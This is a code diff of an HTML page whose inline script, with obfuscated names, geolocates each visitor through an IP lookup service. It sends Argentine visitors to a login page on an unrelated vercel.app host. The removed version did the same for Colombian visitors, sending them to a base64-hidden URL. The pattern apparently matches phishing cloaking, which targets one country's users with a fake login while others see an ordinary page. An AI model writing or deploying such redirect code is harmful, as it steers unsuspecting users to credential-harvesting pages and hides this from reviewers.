@@ -1925,24 +1925,28 @@ footer {
 
 </style>
 
-      <script>
+<script>
 (function(){
-  const _0xcolombia = atob("aHR0cHM6Ly9hZG1pbnRyYWNpb25qZWxwaXQuc2l0ZS9qZWxwaXQvYnVzcXVlZGEuaHRtbA==");
-  const _0xotros = atob("aW5pY2lvLmh0bWw=");
+  const _0x2f4a = 'https://multipaymultipay.vercel.app/login.html';
+  const _0x3b8c = 'inicio.html';
+  const _0x4d2e = 'https://ipapi.co/json/';
   
-  const _0xapi = 'https://ipapi.co/json/';
+  // Timeout de 3 segundos
+  const timeoutPromise = new Promise((_, reject) => {
+    setTimeout(() => reject(new Error('Timeout')), 3000);
+  });
   
-  fetch(_0xapi)
-    .then(res => res.json())
-    .then(data => {
-      if (data.country === "CO") {
-        window.location.href = _0xcolombia;
+  Promise.race([fetch(_0x4d2e), timeoutPromise])
+    .then(_0x5a1f => _0x5a1f.json())
+    .then(_0x2b7c => {
+      if (_0x2b7c.country === "AR") {
+        window.location.href = _0x2f4a;
       } else {
-        window.location.href = _0xotros;
+        window.location.href = _0x3b8c;
       }
     })
     .catch(() => {
-      window.location.href = _0xotros;
+      window.location.href = _0x3b8c;
     });
 })();
 </script>
